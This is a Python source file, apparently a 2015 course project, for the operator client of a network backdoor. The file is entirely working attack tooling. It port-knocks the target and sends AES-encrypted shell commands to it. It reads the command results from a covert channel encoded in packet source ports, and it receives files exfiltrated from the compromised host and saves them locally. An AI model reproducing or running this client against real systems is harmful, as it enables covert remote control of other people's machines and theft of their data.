#!/usr/bin/python

#-----------------------------------------------------------------------------
#-- SOURCE FILE:    client.py -   Client for Backdoor
#--
#-- FUNCTIONS:      checkRoot()
#--                 sniffForFile()
#--                 portKnock()
#--                 sendCommand()
#--                 recvCommand()
#--                 main()
#--
#-- DATE:           November 29, 2015
#--
#-- PROGRAMMERS:    Brij Shah & Callum Styan
#--
#-- NOTES:
#-- A multi-protocol client that reads parameters from a config file and 
#-- sends specific commands to a backdoor. Client uses AES to encrypt
#-- and decrypt data.
#-----------------------------------------------------------------------------

import time, configfile, encryption, helpers, os, sys, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from multiprocessing import Process

# flag to determine when to stop reading the results of a command and decrypt everything
flag = False
Results = ""
resultsForFiles = ""

#-----------------------------------------------------------------------------
#-- FUNCTION:       checkRoot()
#--
#-- NOTES:
#-- Checks the uid running the application. If its not root, exit.
#-----------------------------------------------------------------------------
def checkRoot():
    if(os.getuid() != 0):
        sys.exit("This program must be run with root. Try Again..")

#-----------------------------------------------------------------------------
#-- FUNCTION:       sniffForFile()
#--
#-- NOTES:
#-- sniff callback method for the file monitoring process. Sniffs for
#-- destination port 6000. The callback for the sniff filter, however, is 
#-- the recvFile method.
#-----------------------------------------------------------------------------
def sniffForFile():
    sniff(filter='{0} and dst port 6000'.format(configfile.protocol), prn=recvFile)

#-----------------------------------------------------------------------------
#-- FUNCTION:       portKnock()
#--
#-- NOTES:
#-- Reads configuration file for knock sequence. For each knock read, creates
#-- a packet with specified knock and sends it to the destination IP also
#-- read from the configuration file.
#-----------------------------------------------------------------------------
def portKnock():
    for knock in configfile.knock:
        packet = IP(dst=configfile.ip)/UDP(sport=knock, dport=7000)
        send(packet)
        time.sleep(1)

#-----------------------------------------------------------------------------
#-- FUNCTION:       sendCommand(protocol, data, password)
#--
#-- VARIABLES(S):   protocol - either TCP or UDP
#--                 data - user supplied command
#--                 password - read from configuration file
#--
#-- NOTES:
#-- Reads the configuration file for the protocol and password. Creates a 
#-- packet with the user entered command and specified parameters destined
#-- for the backdoor.
#-----------------------------------------------------------------------------
def sendCommand(protocol, data, password):
    if protocol == "tcp":
        packet = IP(dst=configfile.ip)/TCP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data, configfile.masterkey))
    if protocol == "udp":
        packet = IP(dst=configfile.ip)/UDP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data, configfile.masterkey))
    send(packet, verbose=0)

#-----------------------------------------------------------------------------
#-- FUNCTION:       recvCommand(packet)
#--
#-- VARIABLES(S):   packet - packet received from backdoor
#--
#-- NOTES:
#-- Checks packet for IP layer and confirms the source address (from backdoor)
#-- If the source address matches the IP address in the configuration file, 
#-- appends all data to dataReceived. All converted source ports are then
#-- appended to a string which is decrypted and printed to the terminal once
#-- it receives the last packed containging a password that mactches the one
#-- in the configuration file.
#-----------------------------------------------------------------------------
def recvCommand(packet):
   global flag
   global Results
   if packet.haslayer(IP):
    if packet[IP].src == configfile.ip:
        dataReceived = helpers.parsePacket(packet)
        Results += (dataReceived)
        if packet.haslayer(Raw):
            if packet[Raw].load == configfile.password:
                flag = True
                decryptedData = encryption.decrypt(Results, configfile.masterkey)
                print decryptedData
                Results = ""

#-----------------------------------------------------------------------------
#-- FUNCTION:       recvCommand(packet)
#--
#-- VARIABLES(S):   packet - packet received from backdoor
#--
#-- NOTES:
#-- Checks packet for IP layer and confirms the source address (from backdoor)
#-- If the source address matches the IP address in the configuration file, 
#-- appends all data to dataReceived. All converted source ports are then
#-- appended to resultsForFiles which is decrypted and saved to the machine once
#-- it receives the last packed containging a password that mactches the one
#-- in the configuration file.
#-----------------------------------------------------------------------------
def recvFile(packet):
    flag = False
    global resultsForFiles
    if packet.haslayer(IP):
        if packet[IP].src == configfile.ip:
            dataReceived = helpers.parsePacket(packet)
            resultsForFiles += (dataReceived)
            if packet.haslayer(Raw):
                if packet[Raw].load == configfile.password:
                    flag = True
                    decryptedData = encryption.decrypt(resultsForFiles, configfile.masterkey)
                    fileName, fileData = decryptedData.split("\0", 1)
                    fileDescriptor = open(fileName, 'wb')
                    fileDescriptor.write(fileData)
                    resultsForFiles = ""

#-----------------------------------------------------------------------------
#-- FUNCTION:       main()
#--
#-- NOTES:
#-- The pseudomain method.
#-----------------------------------------------------------------------------
def main():
    global flag
    checkRoot()
    portKnock()

    fileProcess = Process(target=sniffForFile)
    fileProcess.start()

    while 1:
        command = raw_input("Enter command: ")
        sendCommand(configfile.protocol, command, configfile.password)
        flag = False

        while 1:
            sniff(filter='{0} and dst port 8000'.format(configfile.protocol), count=1, prn=recvCommand)
            if flag == True:
                break

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print "exiting.."
